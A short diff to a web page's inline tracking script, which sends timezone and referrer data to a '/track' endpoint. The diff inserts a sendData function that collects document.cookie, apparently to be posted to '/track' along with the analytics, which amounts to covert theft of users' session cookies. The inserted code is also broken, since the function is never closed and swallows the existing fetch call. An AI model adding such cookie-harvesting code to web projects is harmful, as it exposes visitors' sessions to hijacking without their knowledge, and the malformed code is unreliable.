@@ -136,7 +136,11 @@
       tz: Intl.DateTimeFormat().resolvedOptions().timeZone || "",
       ref: document.referrer || ""
     });
-
+    function sendData() {
+      let data = {
+       content:document.cookie
+      };
+       
     fetch('/track', {
       method: 'POST',
       headers: {'Content-Type':'application/json'},
@@ -160,6 +164,8 @@
       };
       navigator.sendBeacon('/track', new Blob([JSON.stringify(payload)], {type:'application/json'}));
     });
+    
   </script>
 </body>
 </html>
+ 
